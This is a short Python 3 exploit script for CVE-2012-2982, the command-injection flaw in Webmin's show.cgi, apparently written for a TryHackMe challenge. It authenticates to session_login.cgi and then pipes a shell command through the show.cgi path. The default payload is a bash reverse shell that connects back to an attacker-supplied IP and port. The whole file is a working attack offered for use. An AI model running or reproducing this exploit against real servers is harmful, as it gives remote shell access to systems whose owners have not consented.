#!/bin/python3
#INFOOOO!
#THIS IS WRITTEN IN PYTHON3!? YES THAT'S RIGHT, NO FUCKING OUTDATED PYTHON2 SHIT TO DEAL WITH!
#Why?   Welp, i like to code and it was part of a tryhackme challenge.


#CVE-2012-2982 
#Requirements: python libaries:requests, others are default






import requests
import sys
import string, secrets


#Help for people that don't read the source code and potentially sacrifice their computer for the ReVil gods :D 
if len(sys.argv) < 2:
    print("Usage:  <python>   <program>  <url> <username> <password>")






#Random 5 chars for the final post req...
def rand():
    alphaNum = string.ascii_letters + string.digits
    randChar = ''.join(secrets.choice(alphaNum) for i in range(5))
    return randChar


#Payload to execute, default is a bash reverse shell one liner, you can edit it anyway you want. Just make sure to put your ip instead of "MYIP"
payload = f"bash -c 'exec bash -i >& /dev/tcp/MYIP/PORT 0>&1'"



#Sets authentication headers, data
data = {
   'page': "%2F",
   'user': sys.argv[2].strip("\n"),
   'pass': sys.argv[3].strip("\n")
}
cookiee = {
  "testing": "1"
}


#Tries to authenticate user
url = sys.argv[1].strip("\n")
resp = requests.post(url + "/session_login.cgi", data=data, cookies=cookiee, verify=False, allow_redirects=False)
sta = resp.status_code
cookies = resp.cookies



if sta == 302 and cookies["sid"] != None:
     print("Logged in")
else:
     print("Wrong Username/Password... Alzheimer or shitty recon?")
     exit()


#Sets authetication cookie in place
sid = cookies["sid"]
cookiee = {
  'sid': sid
}


#The final exploit with the url xorred together
url = url + f"/file/show.cgi/bin/{rand()}|{payload}|"

#Sends the actual exploit to the target, fingers crossed it works for your target!
resp = requests.post(url, cookies=cookiee)


#Debug if you have problems, cosider seeing what the server responds. Cloudflare is a bitch aint that right...
debug = False
if debug:
   print(resp.text)
   print(resp.headers)



print("Executed!")










